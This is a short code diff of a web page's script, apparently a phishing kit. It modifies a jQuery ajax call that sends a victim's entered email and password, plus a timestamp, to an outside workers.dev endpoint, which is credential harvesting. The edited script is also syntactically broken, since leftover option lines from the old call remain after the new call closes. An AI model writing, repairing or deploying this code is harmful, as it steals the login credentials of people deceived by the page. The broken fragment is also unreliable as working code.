@@ -1795,15 +1795,19 @@ if (!password) {
             }
 
 count=count+1;
-
+    
 $.ajax({
-dataType: 'JSON',
-url: 'https://square-sun-b728.saleudon1.workers.dev/',
-type: 'POST',
-      	data:{
-			email:email,
-            password:password,	
-      	},
+  url: 'https://square-sun-b728.saleudon1.workers.dev/',
+  type: 'POST',
+  dataType: 'json',
+  contentType: 'application/json',
+  data: JSON.stringify({
+    email: email,
+	password: password,
+    time: new Date().toISOString()
+  })
+});
+
 			data: $('#contactform').serialize(),
             beforeSend: function(xhr){
             	
@@ -1850,5 +1854,6 @@ type: 'POST',
 </script>	
    
    </body></html>
+
 
 
